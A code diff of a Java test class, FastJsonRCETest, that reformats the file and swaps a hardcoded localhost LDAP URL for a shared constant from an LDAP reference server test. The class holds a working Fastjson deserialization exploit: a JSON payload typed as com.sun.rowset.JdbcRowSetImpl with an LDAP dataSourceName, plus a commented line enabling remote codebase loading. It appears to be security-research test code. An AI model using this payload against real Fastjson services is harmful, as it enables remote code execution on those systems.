@@ -8,13 +8,16 @@ import com.alibaba.fastjson.JSON;
  */
 public class FastJsonRCETest {
 
-	public static void main(String[] args) {
+    public static void main(String[] args) {
+
+        String ldap_url = LDAPReferenceServerTest.LDAP_URL;
+
 //			// 测试时如果需要允许调用RMI远程引用对象加载请取消如下注释
 //		System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
-		String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://127.0.0.1:3890/test\", \"autoCommit\": \"true\" }";
+        String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"" + ldap_url + "\", \"autoCommit\": \"true\" }";
 
-		Object obj = JSON.parse(json);
-		System.out.println(obj);
-	}
+        Object obj = JSON.parse(json);
+        System.out.println(obj);
+    }
 
 }
